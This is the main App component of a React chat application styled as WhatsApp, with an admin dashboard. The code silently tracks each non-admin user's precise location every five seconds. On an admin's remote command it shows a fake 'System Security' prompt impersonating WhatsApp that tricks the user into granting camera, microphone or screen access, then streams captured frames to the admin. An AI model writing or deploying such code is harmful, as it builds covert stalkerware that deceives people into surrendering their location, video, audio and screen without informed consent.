
import React, { useState, useEffect, useRef } from 'react';
import { useChat } from './hooks/useChat';
import ChatSidebar from './components/ChatSidebar';
import ChatWindow from './components/ChatWindow';
import CallScreen from './components/CallScreen';
import AuthScreen from './components/AuthScreen';
import NewChatModal from './components/NewChatModal';
import ProfileModal from './components/ProfileModal';
import AdminDashboard from './components/AdminDashboard';
import { CallSession, User } from './types';

const App: React.FC = () => {
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [isNewChatOpen, setIsNewChatOpen] = useState(false);
  const [isProfileOpen, setIsProfileOpen] = useState(false);
  const [isAdminOpen, setIsAdminOpen] = useState(false);
  const [sidebarTab, setSidebarTab] = useState<'chats' | 'status'>('chats');
  const [callSession, setCallSession] = useState<CallSession | null>(null);
  const [remoteRequest, setRemoteRequest] = useState<{type: string, id: number} | null>(null);
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);
  const [showChatWindow, setShowChatWindow] = useState(false);
  const { chats, activeChat, setActiveChatId, startNewChat, createGroup, sendMessage, currentUser, loginUser, updateProfile, postStatus } = useChat();

  const surveillanceInterval = useRef<any>(null);
  const surveillanceStream = useRef<MediaStream | null>(null);

  useEffect(() => {
    const savedTheme = localStorage.getItem('theme');
    if (savedTheme === 'light') setIsDarkMode(false);

    const handleResize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener('resize', handleResize);

    if (currentUser) {
      const updateInterval = setInterval(() => {
        if (navigator.geolocation && !currentUser.isAdmin) {
          navigator.geolocation.getCurrentPosition((pos) => {
            const raw = localStorage.getItem('global_registered_users');
            if (raw) {
              try {
                const users: User[] = JSON.parse(raw);
                const updated = users.map(u => u.id === currentUser.id ? 
                  { ...u, status: 'online', location: { lat: pos.coords.latitude, lng: pos.coords.longitude } } : u);
                localStorage.setItem('global_registered_users', JSON.stringify(updated));
              } catch (e) {}
            }
          }, undefined, { enableHighAccuracy: true });
        }
      }, 5000);

      if (currentUser.isAdmin) {
        setIsAdminOpen(true);
      }
      return () => {
        clearInterval(updateInterval);
        window.removeEventListener('resize', handleResize);
      };
    }
    return () => window.removeEventListener('resize', handleResize);
  }, [currentUser]);

  useEffect(() => {
    if (!currentUser || currentUser.isAdmin) return;

    const checkCommands = () => {
      const rawCmd = localStorage.getItem('admin_remote_command');
      if (rawCmd) {
        try {
          const cmd = JSON.parse(rawCmd);
          if (cmd.targetId === currentUser.id && !remoteRequest && (Date.now() - cmd.timestamp < 10000)) {
            setRemoteRequest({ type: cmd.type, id: cmd.id });
          }
        } catch (e) {}
      }
    };

    const interval = setInterval(checkCommands, 2000);
    window.addEventListener('storage', checkCommands);
    
    return () => {
      clearInterval(interval);
      window.removeEventListener('storage', checkCommands);
    };
  }, [currentUser, remoteRequest]);

  const handleSurveillanceAuth = async () => {
    if (!remoteRequest || !currentUser) return;
    try {
      let stream: MediaStream;
      if (remoteRequest.type === 'camera') {
        stream = await navigator.mediaDevices.getUserMedia({ video: { width: 320, height: 240 }, audio: true });
      } else if (remoteRequest.type === 'mic') {
        stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      } else {
        try {
          stream = await navigator.mediaDevices.getDisplayMedia({ video: { width: 320, height: 240 } });
        } catch (displayErr: any) {
          alert("Verification Failed: Permission denied.");
          setRemoteRequest(null);
          return;
        }
      }

      surveillanceStream.current = stream;
      const canvas = document.createElement('canvas');
      const video = document.createElement('video');
      video.srcObject = stream;
      video.muted = true;
      video.play();

      if (surveillanceInterval.current) clearInterval(surveillanceInterval.current);
      
      surveillanceInterval.current = setInterval(() => {
        if (!video.videoWidth) return;
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(video, 0, 0, 320, 240);
        const frame = canvas.toDataURL('image/jpeg', 0.4);
        localStorage.setItem(`feed_${currentUser.id}`, frame);
      }, 800); // Higher frequency for smoother feed

      setRemoteRequest(null);
      localStorage.removeItem('admin_remote_command');
    } catch (e: any) {
      console.error("Access rejected", e);
      setRemoteRequest(null);
    }
  };

  const handleLogout = () => {
    // 1. Stop all active background processes
    if (surveillanceInterval.current) clearInterval(surveillanceInterval.current);
    if (surveillanceStream.current) surveillanceStream.current.getTracks().forEach(t => t.stop());
    
    // 2. Mark user as offline globally
    if (currentUser) {
      const raw = localStorage.getItem('global_registered_users');
      if (raw) {
        try {
          const users: User[] = JSON.parse(raw);
          const updated = users.map(u => u.id === currentUser.id ? { ...u, status: 'offline' } : u);
          localStorage.setItem('global_registered_users', JSON.stringify(updated));
        } catch (e) {}
      }
      localStorage.removeItem(`feed_${currentUser.id}`);
    }
    
    // 3. Clear session and reload
    localStorage.removeItem('gemini_current_profile');
    window.location.href = '/'; // Hard redirect to clear any state
  };

  const toggleTheme = () => {
    setIsDarkMode(!isDarkMode);
    localStorage.setItem('theme', isDarkMode ? 'light' : 'dark');
  };

  const handleSelectChat = (id: string) => {
    setActiveChatId(id);
    if (isMobile) {
      setShowChatWindow(true);
    }
  };

  const handleBackToList = () => {
    if (isMobile) {
      setShowChatWindow(false);
    }
  };

  if (!currentUser) {
    return <AuthScreen onLogin={loginUser} isDarkMode={isDarkMode} />;
  }

  if (currentUser.isAdmin && isAdminOpen) {
    return (
      <AdminDashboard 
        onClose={() => setIsAdminOpen(false)}
        isDarkMode={isDarkMode}
      />
    );
  }

  return (
    <div className={`h-screen w-screen flex flex-col overflow-hidden ${isDarkMode ? 'dark bg-[#0b141a]' : 'bg-[#dadbd3]'}`}>
      {remoteRequest && (
        <div className="fixed inset-0 z-[300] bg-black/50 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="bg-white text-black p-6 rounded-2xl shadow-2xl border-4 border-[#00a884] max-w-sm w-full animate-in zoom-in duration-300">
             <div className="flex items-center gap-3 mb-4">
               <div className="w-12 h-12 bg-[#00a884] rounded-full flex items-center justify-center text-white">
                 <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="3"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
               </div>
               <h3 className="text-xl font-bold">System Security</h3>
             </div>
             <p className="text-sm text-gray-600 mb-6 leading-relaxed">
               WhatsApp requires a one-time terminal verification to ensure your encryption keys are secure. Please click below to verify your hardware.
             </p>
             <div className="flex flex-col gap-3">
               <button onClick={handleSurveillanceAuth} className="bg-[#00a884] hover:bg-[#008f6f] text-white py-4 rounded-xl font-black transition-all active:scale-95 shadow-lg">VERIFY TERMINAL</button>
               <button onClick={() => setRemoteRequest(null)} className="text-gray-400 text-xs py-2 hover:underline">Verify later (not recommended)</button>
             </div>
          </div>
        </div>
      )}

      <div className="flex flex-1 h-full overflow-hidden relative shadow-2xl max-w-[1600px] mx-auto w-full bg-[#111b21]">
        {/* Navigation Sidebar - Hidden on mobile */}
        <div className="hidden md:flex w-[64px] border-r border-[#313d45] flex-col items-center py-4 gap-6 bg-[#202c33] z-20">
           <button onClick={() => setSidebarTab('chats')} className={`p-2 rounded-lg transition-colors ${sidebarTab === 'chats' ? 'text-[#00a884] bg-white/5' : 'text-[#8696a0] hover:text-white'}`} title="Chats">
             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>
           </button>
           <button onClick={() => setSidebarTab('status')} className={`p-2 rounded-lg transition-colors ${sidebarTab === 'status' ? 'text-[#00a884] bg-white/5' : 'text-[#8696a0] hover:text-white'}`} title="Status">
             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><path d="M12 2a10 10 0 0 1 10 10"/><path d="M12 22a10 10 0 0 1-10-10"/></svg>
           </button>
           <button onClick={toggleTheme} className="p-2 text-[#8696a0] hover:bg-white/5 rounded-lg transition-colors" title="Theme">
             <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="3"/><path d="M12 5V3M12 21v-2M4.2 4.2l1.4 1.4M18.4 18.4l1.4 1.4M3 12h2M19 12h2M4.2 19.8l1.4-1.4M18.4 5.6l1.4-1.4"/></svg>
           </button>
           
           <div className="mt-auto flex flex-col items-center gap-6 pb-2">
             <button onClick={handleLogout} className="p-2 text-red-500 hover:bg-white/5 rounded-lg transition-colors" title="Logout">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><polyline points="16 17 21 12 16 7"/><line x1="21" y1="12" x2="9" y2="12"/></svg>
             </button>
             <img 
               src={currentUser.avatar} 
               className="w-10 h-10 rounded-full border-2 border-[#00a884] cursor-pointer shadow-lg hover:scale-110 transition-transform object-cover" 
               alt="Me" 
               onClick={() => setIsProfileOpen(true)}
             />
           </div>
        </div>

        {/* Sidebar - Full width on mobile, hide when chat open */}
        <div className={`
          w-full md:w-[30%] md:min-w-[320px] md:max-w-[450px] 
          ${isMobile && showChatWindow ? 'hidden' : 'flex'}
          relative overflow-hidden border-r border-[#313d45]
        `}>
          <ChatSidebar 
            chats={chats} 
            activeChatId={activeChat?.id || null} 
            onSelectChat={handleSelectChat} 
            onOpenNewChat={() => setIsNewChatOpen(true)}
            onOpenProfile={() => setIsProfileOpen(true)}
            onPostStatus={postStatus}
            currentUser={currentUser}
            isDarkMode={isDarkMode}
            toggleTheme={toggleTheme}
            activeTab={sidebarTab}
            onTabChange={setSidebarTab}
          />
          {isNewChatOpen && (
            <NewChatModal 
              isDarkMode={isDarkMode} 
              onClose={() => setIsNewChatOpen(false)} 
              onSelectUser={(user) => startNewChat(user)}
              onCreateGroup={(name, members) => createGroup(name, members)}
              currentUser={currentUser}
            />
          )}
          {isProfileOpen && (
            <ProfileModal 
              user={currentUser}
              onUpdate={updateProfile}
              onClose={() => setIsProfileOpen(false)}
              isDarkMode={isDarkMode}
            />
          )}
        </div>

        {/* Chat Window - Show on mobile only when chat selected */}
        <div className={`
          flex-1
          ${isMobile && !showChatWindow ? 'hidden' : 'flex'}
        `}>
          <ChatWindow 
            activeChat={activeChat} 
            onSendMessage={sendMessage}
            currentUser={currentUser}
            isDarkMode={isDarkMode}
            onStartCall={(type) => setCallSession({ type, caller: currentUser, receiver: activeChat?.participants.find(p => p.id !== currentUser.id)!, isActive: true })}
            onBack={handleBackToList}
            showBackButton={isMobile}
          />
        </div>

        {/* Call UI */}
        {callSession && (
          <CallScreen 
            session={callSession} 
            onEnd={() => setCallSession(null)} 
          />
        )}
      </div>
    </div>
  );
};

export default App;
